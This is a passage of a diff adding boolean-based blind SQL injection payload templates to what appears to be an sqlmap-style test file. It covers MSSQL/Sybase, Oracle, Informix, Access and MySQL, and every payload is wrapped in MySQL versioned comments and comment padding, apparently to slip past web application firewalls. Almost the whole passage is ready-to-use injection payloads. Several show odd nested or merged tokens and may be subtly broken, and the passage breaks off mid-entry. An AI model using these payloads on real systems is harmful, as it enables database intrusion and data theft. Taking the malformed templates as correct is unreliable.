+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/0/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSMASTER:SYSDUAL)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/0/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSMASTER:SYSDUAL)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/0/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSMASTER:SYSDUAL)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Informix boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSMASTER:SYSDUAL)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSMASTER:SYSDUAL)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSMASTER:SYSDUAL)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Informix</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>/*!50000IIF(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,1/0)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,1/0)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,1/0)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access boolean-based blind - Parameter replace (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>/*!50000IIF(/*!50000[INFERENCE]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/,1/0)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/,1/0)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/,1/0)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <!-- Works in MySQL, Oracle, etc. -->
+    <test>
+        <title>Boolean-based blind - Parameter replace (DUAL)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>Boolean-based blind - Parameter replace (DUAL - original value)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+    </test>
+    <!-- End of boolean-based blind tests - Parameter replace -->
+
+    <!-- Works in SAP MaxDB, Informix, etc. -->
+    <test>
+        <title>Boolean-based blind - Parameter replace (CASE)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>Boolean-based blind - Parameter replace (CASE - original value)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+    </test>
+    <!-- End of boolean-based blind tests - Parameter replace -->
+
+    <!-- Boolean-based blind tests - ORDER BY, GROUP BY clause -->
+    <test>
+        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
